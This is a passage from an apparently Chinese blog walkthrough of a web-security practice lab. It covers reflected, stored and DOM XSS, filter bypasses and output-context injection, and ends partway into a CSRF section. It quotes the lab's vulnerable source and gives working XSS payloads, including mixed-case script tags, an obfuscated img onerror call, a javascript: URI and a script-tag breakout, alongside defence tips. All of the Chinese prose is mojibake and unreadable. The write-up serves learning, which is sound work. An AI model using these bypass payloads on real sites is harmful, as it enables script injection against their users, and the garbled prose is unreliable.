src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209155727378.png"></p><p>å¡«å¥½åè¿˜æœ‰å‡ ç‚¹éœ€è¦ä¿®æ”¹</p><p>ä¸€æ˜¯æ¯æ¬¡è¿”å›çš„tokenéƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥çº¿ç¨‹ä¸èƒ½å¤šå¼€ï¼Œåªèƒ½è®¾ç½®ä¸º1</p><p>è¿˜æœ‰ä¸€ä¸ªå°±æ˜¯è¦æŠŠé‡å®šå‘è®¾ä¸ºä¸€ç›´å¼€ç€ï¼Œæˆ‘ä¸€å¼€å§‹æ²¡å¼€å‡ºé—®é¢˜äº†ï¼Œåé¢çœ‹äº†åˆ«äººåšçš„æ‰çŸ¥é“è¦å¼€è¿™ä¸ª(åŸå› æ˜¯ä¸å¼€çš„è¯å°±æ‰“ä¸å¼€htmlçš„bodyï¼Œè€Œtokenæ˜¯åœ¨bodyé‡Œé¢çš„ï¼Œæ‰“ä¸å¼€å°±ä¸èƒ½æ¯æ¬¡è‡ªåŠ¨è·å–tokenäº†)</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209155214778.png"></p><p>ç»“æœï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209155943842.png"></p><h2 id="XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰"><a href="#XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰" class="headerlink" title="XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰"></a>XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰</h2><blockquote><p>Cross-Site Scripting ç®€ç§°ä¸ºâ€œCSSâ€ï¼Œä¸ºé¿å…ä¸å‰ç«¯å æˆæ ·å¼è¡¨çš„ç¼©å†™â€CSSâ€å†²çªï¼Œæ•…åˆç§°XSSã€‚ä¸€èˆ¬XSSå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹å‡ ç§å¸¸è§ç±»å‹ï¼š</p><p>åå°„æ€§XSS;</p><p>å­˜å‚¨å‹XSS;</p><p>DOMå‹XSS;</p><p>XSSæ¼æ´ä¸€ç›´è¢«è¯„ä¼°ä¸ºwebæ¼æ´ä¸­å±å®³è¾ƒå¤§çš„æ¼æ´ï¼Œåœ¨OWASP TOP10çš„æ’åä¸­ä¸€ç›´å±äºå‰ä¸‰çš„æ±Ÿæ¹–åœ°ä½ã€‚<br>XSSæ˜¯ä¸€ç§å‘ç”Ÿåœ¨å‰ç«¯æµè§ˆå™¨ç«¯çš„æ¼æ´ï¼Œæ‰€ä»¥å…¶å±å®³çš„å¯¹è±¡ä¹Ÿæ˜¯å‰ç«¯ç”¨æˆ·ã€‚<br>å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚<br>å› æ­¤åœ¨XSSæ¼æ´çš„é˜²èŒƒä¸Šï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨â€œå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤â€å’Œâ€œè¾“å‡ºè¿›è¡Œè½¬ä¹‰â€çš„æ–¹å¼è¿›è¡Œå¤„ç†:<br><strong>è¾“å…¥è¿‡æ»¤ï¼šå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥;</strong><br><strong>è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰;</strong></p></blockquote><h3 id="åå°„å‹xss-get"><a href="#åå°„å‹xss-get" class="headerlink" title="åå°„å‹xss(get)"></a>åå°„å‹xss(get)</h3><p>å…ˆå¼¹ä¸ªjsçœ‹çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209161457880.png"></p><p>å‘ç°é™åˆ¶äº†å­—ç¬¦æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209162036377.png"></p><p>æ”¹å¤§ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210209162320605.png"></p><h3 id="åå°„å‹xss-post"><a href="#åå°„å‹xss-post" class="headerlink" title="åå°„å‹xss(post)"></a>åå°„å‹xss(post)</h3><p>ç™»å½•è¿›å»å°±å¯ä»¥æ­£å¸¸æäº¤</p><h3 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹xss</h3><p><strong>åŸç†</strong></p><blockquote><p>å­˜å‚¨å‹xssæ˜¯åœ¨åå°æ•°æ®åº“é‡Œï¼Œå¦‚æœåˆ·æ–°äº†ï¼Œç•™è¨€åˆ—è¡¨ä¼šä»æ•°æ®åº“é‡æ–°æå–å‡ºxssæ•°æ®å¼¹æ¡†</p></blockquote><h3 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h3><p>æäº¤ååªæœ‰ä¸€ä¸ªè¶…é“¾æ¥ï¼Œæ£€æŸ¥ä»£ç åå‘å…ˆæŒ‡å‘è‡ªå·±å†™çš„è¯­å¥</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimgimage-20210209163558220.png"></p><p>å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯DOMï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰</p><blockquote><p>DOMæ˜¯ä¸€ç§æ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ç”¨äºhtmlç¼–ç¨‹çš„æ¥å£ï¼Œé€šè¿‡domæ¥æ“ä½œé¡µé¢ä¸­çš„å…ƒç´ ã€‚å½“htmlé¡µé¢è¢«å®ç°åŠ è½½çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šåˆ›å»ºä¸€ä¸ªDOMï¼Œç»™æ–‡æ¡£æä¾›äº†ä¸€ç§æ–°çš„é€»è¾‘ç»“æ„ï¼Œå¹¶ä¸”å¯ä»¥æ”¹å˜å†…å®¹å’Œç»“æ„ã€‚</p><p>DOMæ˜¯é¢å‘å¯¹è±¡ï¼Œå¹¶ä¸”å®šä¹‰äº†ä¿®æ”¹æ–‡æ¡£æ‰€éœ€è¦çš„å¯¹è±¡ï¼Œå„ä¸ªå¯¹è±¡ä¹‹å‰çš„å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥ä¹Ÿé¡µé¢ä¸Šçš„DOMçœ‹æˆä¸€ä¸ªæ ‘çŠ¶ç»“æ„ï¼Œé€šè¿‡jsï¼Œå¯¹htmlæ–‡æ¡£è¿›è¡Œæ·»åŠ æ’ç‰ˆï¼Œjsè¦æƒ³è®¿é—®htmlä¸­çš„å…ƒç´ ï¼Œå°±è¦é€šè¿‡å¯¹è±¡æ¨¡å‹æ¥è·å¾—ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210209202621325.png"></p><p>å®¡æŸ¥æºç </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">var</span> str <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>   document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"dom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>str<span class="token operator">+</span><span class="token string">"'&gt;what do you see?&lt;/a&gt;"</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token comment">//è¯•è¯•ï¼š'&gt;&lt;img src="#" onmouseover="alert('xss')"&gt;</span><span class="token comment">//è¯•è¯•ï¼š' onclick="alert('xss')"&gt;,é—­åˆæ‰å°±è¡Œ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬è¾“å…¥çš„strè¢«domxssè¿™ä¸ªå‡½æ•°æ‰§è¡Œï¼ŒgetElementById è·å–åˆ°äº†æ ‡ç­¾ id ä¸º text çš„å†…å®¹èµ‹å€¼ç»™strï¼Œç„¶ååˆæŠŠ str çš„å†…å®¹é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼å†™åˆ°äº† a æ ‡ç­¾çš„ href å±æ€§ä¸­ï¼Œaæ ‡ç­¾ä¼šå†™åˆ° id ä¸º domçš„ div æ ‡ç­¾ä¸­ã€‚</p><p>æºç ç»™äº†æˆ‘ä»¬æç¤ºï¼Œåªéœ€è¦é—­åˆå‰é¢çš„ï¼Œæˆ‘ä»¬åé¢çš„å°±èƒ½æ­£å¸¸æ‰§è¡Œäº†</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">payload1ï¼š<span class="token string">'&gt;&lt;img src="#" onmouseover="alert('</span>hello'<span class="token punctuation">)</span>"<span class="token operator">&gt;</span>payload2<span class="token operator">:</span><span class="token string">' onclick="alert('</span>hello'<span class="token punctuation">)</span>"<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DOMå‹xss-x"><a href="#DOMå‹xss-x" class="headerlink" title="DOMå‹xss-x"></a>DOMå‹xss-x</h3><p>åŒæ ·çš„å®¡æŸ¥æºç </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">var</span> str <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">;</span>   <span class="token keyword">var</span> txss <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"text="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">var</span> xss <span class="token operator">=</span> txss<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// alert(xss);</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"dom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>xss<span class="token operator">+</span><span class="token string">"'&gt;å°±è®©å¾€äº‹éƒ½éšé£,éƒ½éšé£å§&lt;/a&gt;"</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span><span class="token comment">//è¯•è¯•ï¼š'&gt;&lt;img src="#" onmouseover="alert('xss')"&gt;</span><span class="token comment">//è¯•è¯•ï¼š' onclick="alert('xss')"&gt;,é—­åˆæ‰å°±è¡Œ     </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payloadå’Œä¸Šé¢ä¸€æ ·ï¼ŒæŠŠæ„é€ é—­åˆè¯­å¥å°±è¡Œ</p><p>ä¸å‰é¢çš„ä¸åŒå®ƒæ˜¯ä»æµè§ˆå™¨URLä¸­è·å–è¾“å…¥çš„ã€‚ <code>window.location.search</code> è·å–URLçš„å†…å®¹ï¼Œå†èµ‹å€¼ç»™ str ï¼Œç»è¿‡URLè§£ç å’Œå­—ç¬¦ä¸²åˆ†éš”ï¼Œå–å‡ºURLä¸­çš„å‚æ•°å†…å®¹ï¼Œå†æŠŠ +æ›¿æ¢ä¸ºç©ºæ ¼ï¼Œèµ‹å€¼ç»™ xssï¼Œæœ€åæŠŠ xss æ‹¼æ¥åˆ° a æ ‡ç­¾ä¸­ï¼Œç„¶åå†™åˆ° id ä¸º dom çš„ div æ ‡ç­¾ä¸­</p><h3 id="xssä¹‹ç›²æ‰“"><a href="#xssä¹‹ç›²æ‰“" class="headerlink" title="xssä¹‹ç›²æ‰“"></a>xssä¹‹ç›²æ‰“</h3><blockquote><p>ä¹±æ‰“ï¼Œèƒ½æ’xssè¯­å¥éƒ½æ’ä¸Šï¼Œåªæœ‰åå°ç®¡ç†å‘˜æ‰èƒ½çœ‹åˆ°</p></blockquote><p>æ ¹æ®æç¤ºï¼Œç™»å½•ç•™è¨€åå°</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210209205443889.png"></p><h3 id="xssä¹‹è¿‡æ»¤"><a href="#xssä¹‹è¿‡æ»¤" class="headerlink" title="xssä¹‹è¿‡æ»¤"></a>xssä¹‹è¿‡æ»¤</h3><blockquote><p>å‡ ç§å¸¸è§çš„ç»•è¿‡æ–¹æ³•æ€»ç»“ï¼š</p><p>1.å‰ç«¯jsé™åˆ¶</p><p>2.å¤§å°å†™ç»•è¿‡</p><p>3.åŒå†™ç»•è¿‡</p><p>4.åŠ æ³¨é‡Šæ··æ·†</p><p>5.æ¢ç¼–ç </p></blockquote><p>å…ˆè¯•è¯•çœ‹ä¼šè¿‡æ»¤ä»€ä¹ˆ</p><p>è¾“å…¥ä¸ª<code>&lt;script&gt;alert("äººç”Ÿè‹¦çŸ­")&lt;/script&gt;</code></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210209205913092.png"></p><p>ç›´æ¥å’Œå®ƒè¯´<code>äººç”Ÿè‹¦çŸ­</code></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210209210055468.png"></p><p>æœ‰å¯èƒ½æ˜¯è¿‡æ»¤æ‰äº†scriptä¸­é—´çš„å†…å®¹</p><p>æƒ³åˆ°phpçš„è¿‡æ»¤ï¼Œå…ˆè¯•è¯•æ··ä¸ªå¤§å°å†™èƒ½ä¸èƒ½ç»•è¿‡</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>SCRiPT<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"äººç”Ÿè‹¦çŸ­"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIpT<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœç„¶å¯ä»¥</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210209210646835.png"></p><p>ç™¾åº¦ä¸€ä¸‹xssç»•è¿‡å§¿åŠ¿ï¼Œå‘ç°è¿˜æœ‰è®¸å¤šçš„æ–¹æ³•å¯ä»¥ç»•è¿‡è¿‡æ»¤</p><p>è¿™é¢˜è¿˜å¯ä»¥ä½¿ç”¨imgæ ‡ç­¾æ¥ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">payloads:&lt;img src=x onerror="window['al'+'ert'](AAAAA)"&gt;&lt;/img&gt;&lt;img src=x onerror="window.alert(AAAAA)"&gt;&lt;/img&gt;&lt;img src=x onerror="top['al'+'ert'](AAAAA)"&gt;&lt;/img&gt;&lt;img src=x onerror="top.alert(AAAAA)"&gt;&lt;/img&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="xssä¹‹htmlspecialchars"><a href="#xssä¹‹htmlspecialchars" class="headerlink" title="xssä¹‹htmlspecialchars"></a>xssä¹‹htmlspecialchars</h3><blockquote><p>htmlspecialchars â€” å°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“</p><p>é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯<br>&amp; æˆä¸º &amp;amp<br>â€œ æˆä¸º &amp;quot<br>â€˜ æˆä¸º &amp;#039<br>&lt; æˆä¸º &amp;lt<br>å¯ç”¨å¼•å·ç±»å‹<br>ENT_COMPATï¼šé»˜è®¤ï¼Œä»…ç¼–ç åŒå¼•å·<br>ENT_QUOTESï¼šç¼–ç åŒå¼•å·å’Œå•å¼•å·<br>ENT_NOQUOTESï¼šä¸ç¼–ç ä»»ä½•å¼•å·</p></blockquote><pre class="line-numbers language-none"><code class="language-none">è¾“å‡ ä¸ªé¢„å®šä¹‰å­—ç¬¦çœ‹çœ‹'"&lt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211085207658.png"></p><p>æŠŠhrefæ‹¼æ¥æ‰å¼¹ä¸ªæ¡†è¯•è¯•</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">#<span class="token string">' onclick=alert('</span>å†²å†²å†²<span class="token string">') '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨æºç å¯ä»¥çœ‹åˆ°ï¼Œé—­åˆäº†hrefåŒæ—¶ç‚¹å‡»äº‹ä»¶ä¹Ÿè¢«åŠ äº†è¿›å»</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211090013242.png"></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211085847943.png"></p><h3 id="xssä¹‹hrefè¾“å‡º"><a href="#xssä¹‹hrefè¾“å‡º" class="headerlink" title="xssä¹‹hrefè¾“å‡º"></a>xssä¹‹hrefè¾“å‡º</h3><p>è¿™é¢˜æœ‰ç‚¹æ‡µï¼Œçœ‹äº†ä¸‹æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$message</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$html</span><span class="token operator">.=</span>"<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string single-quoted-string">'{$message}'</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ç”¨javascriptåè®®æ¥æ‰§è¡Œjs</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"è¿™æ ·å­å•Š"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211091239215.png"></p><p><strong>é˜²å¾¡æªæ–½ï¼š</strong></p><ul><li>è¾“å…¥çš„æ—¶å€™åªå…è®¸ http æˆ– https å¼€å¤´çš„åè®®ï¼Œæ‰å…è®¸è¾“å‡º</li><li>å…¶æ¬¡å†è¿›è¡Œhtmlspecialcharså¤„ç†</li></ul><h3 id="xssä¹‹jsè¾“å‡º"><a href="#xssä¹‹jsè¾“å‡º" class="headerlink" title="xssä¹‹jsè¾“å‡º"></a>xssä¹‹jsè¾“å‡º</h3><p>æŸ¥çœ‹æºç </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>    $ms<span class="token operator">=</span><span class="token string">'tmac'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmacç¡®å®å‰å®³,çœ‹é‚£å°çœ¼ç¥..'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment">//            alert($ms);</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'æ— è®ºå¦‚ä½•ä¸è¦æ”¾å¼ƒå¿ƒä¸­æ‰€çˆ±..'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>getä¼ å‚ç»™$mså†è¿›è¡Œåˆ¤æ–­ï¼Œæ—¢ç„¶æ˜¯åœ¨ä¸€ä¸ªscriptæ ‡ç­¾ä¸­ï¼Œå¯ä»¥åœ¨ä¼ å…¥å‚æ•°çš„æ—¶å€™æŠŠå‰ä¸€ä¸ªscriptæ ‡ç­¾ç»™å®ƒæ‹¼æ¥å¥½</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'&lt;/script&gt;&lt;script&gt;alert('</span>Hello<span class="token operator">!</span>'<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="é¢„é˜²"><a href="#é¢„é˜²" class="headerlink" title="é¢„é˜²"></a>é¢„é˜²</h3><ul><li><strong>é•¿åº¦é™åˆ¶</strong></li><li><strong>åŠ éªŒè¯ç </strong></li><li><strong>è¾“å…¥è¿‡æ»¤ï¼šä¸å…è®¸å¯èƒ½å¯¼è‡´XSSæ”»å‡»çš„å­—ç¬¦è¾“å…¥</strong></li><li><strong>è¾“å‡ºè½¬ä¹‰ï¼šæ ¹æ®è¾“å‡ºç‚¹çš„ä½ç½®å¯¹è¾“å‡ºåˆ°å‰ç«¯çš„å†…å®¹è¿›è¡Œé€‚å½“è½¬ä¹‰</strong></li></ul><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html">ç»•è¿‡xssè¿‡æ»¤å§¿åŠ¿æ€»ç»“</a></p><p>â€‹            <a href="https://tech.meituan.com/2018/09/27/fe-security.html">https://tech.meituan.com/2018/09/27/fe-security.html</a></p><h2 id="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"><a href="#CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰" class="headerlink" title="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"></a>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</h2><blockquote><p>CSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )æ¦‚è¿°</p><p>Cross-site request forgery ç®€ç§°ä¸ºâ€œCSRFâ€ï¼Œåœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ã€‚æ‰€ä»¥CSRFæ”»å‡»ä¹Ÿæˆä¸ºâ€one clickâ€æ”»å‡»ã€‚ å¾ˆå¤šäººæä¸æ¸…æ¥šCSRFçš„æ¦‚å¿µï¼Œç”šè‡³æœ‰æ—¶å€™ä¼šå°†å…¶å’ŒXSSæ··æ·†,æ›´æœ‰ç”šè€…ä¼šå°†å…¶å’Œè¶Šæƒé—®é¢˜æ··ä¸ºä¸€è°ˆ,è¿™éƒ½æ˜¯å¯¹åŸç†æ²¡ææ¸…æ¥šå¯¼è‡´çš„ã€‚<br>è¿™é‡Œåˆ—ä¸¾ä¸€ä¸ªåœºæ™¯è§£é‡Šä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©ä½ ç†è§£ã€‚<br><strong>åœºæ™¯éœ€æ±‚ï¼š</strong><br>å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½åœ¨è´­ç‰©ç½‘ç«™tianxie<a href="http://www.xx.comä¸Šå¡«å†™çš„ä¼šå‘˜åœ°å€./">www.xx.comä¸Šå¡«å†™çš„ä¼šå‘˜åœ°å€ã€‚</a><br><strong>å…ˆçœ‹ä¸‹å¤§ç™½æ˜¯å¦‚ä½•ä¿®æ”¹è‡ªå·±çš„å¯†ç çš„ï¼š</strong><br>ç™»å½•â€”ä¿®æ”¹ä¼šå‘˜ä¿¡æ¯ï¼Œæäº¤è¯·æ±‚â€”ä¿®æ”¹æˆåŠŸã€‚<br>æ‰€ä»¥å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½çš„ä¿¡æ¯ï¼Œä»–éœ€è¦æ‹¥æœ‰ï¼š1ï¼Œç™»å½•æƒé™ 2ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯çš„è¯·æ±‚ã€‚</p><p>ä½†æ˜¯å¤§ç™½åˆä¸ä¼šæŠŠè‡ªå·±xxxç½‘ç«™çš„è´¦å·å¯†ç å‘Šè¯‰å°é»‘ï¼Œé‚£å°é»‘æ€ä¹ˆåŠï¼Ÿ<br>äºæ˜¯ä»–è‡ªå·±è·‘åˆ°<a href="http://www.xx.comä¸Šæ³¨å†Œäº†ä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç„¶åä¿®æ”¹äº†ä¸€ä¸‹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šE-mailåœ°å€ï¼‰ï¼Œä»–å‘ç°ä¿®æ”¹çš„è¯·æ±‚æ˜¯ï¼š">www.xx.comä¸Šæ³¨å†Œäº†ä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç„¶åä¿®æ”¹äº†ä¸€ä¸‹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šE-mailåœ°å€ï¼‰ï¼Œä»–å‘ç°ä¿®æ”¹çš„è¯·æ±‚æ˜¯ï¼š</a><br>ã€<a href="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change%E3%80%91">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Changeã€‘</a><br>äºæ˜¯ï¼Œä»–å®æ–½äº†è¿™æ ·ä¸€ä¸ªæ“ä½œï¼šæŠŠè¿™ä¸ªé“¾æ¥ä¼ªè£…ä¸€ä¸‹ï¼Œåœ¨å°ç™½ç™»å½•xxxç½‘ç«™åï¼Œæ¬ºéª—ä»–è¿›è¡Œç‚¹å‡»ï¼Œå°ç™½ç‚¹å‡»è¿™ä¸ªé“¾æ¥åï¼Œä¸ªäººä¿¡æ¯å°±è¢«ä¿®æ”¹äº†,å°é»‘å°±å®Œæˆäº†æ”»å‡»ç›®çš„ã€‚</p><p><strong>ä¸ºå•¥å°é»‘çš„æ“ä½œèƒ½å¤Ÿå®ç°å‘¢ã€‚æœ‰å¦‚ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼š</strong><br>1.<a href="http://www.xxx.comè¿™ä¸ªç½‘ç«™åœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººçš„ä¿¡æ¯æ—¶æ²¡æœ‰è¿‡å¤šçš„æ ¡éªŒ,å¯¼è‡´è¿™ä¸ªè¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ /">www.xxx.comè¿™ä¸ªç½‘ç«™åœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººçš„ä¿¡æ¯æ—¶æ²¡æœ‰è¿‡å¤šçš„æ ¡éªŒï¼Œå¯¼è‡´è¿™ä¸ªè¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ </a>;<br>â€”å› 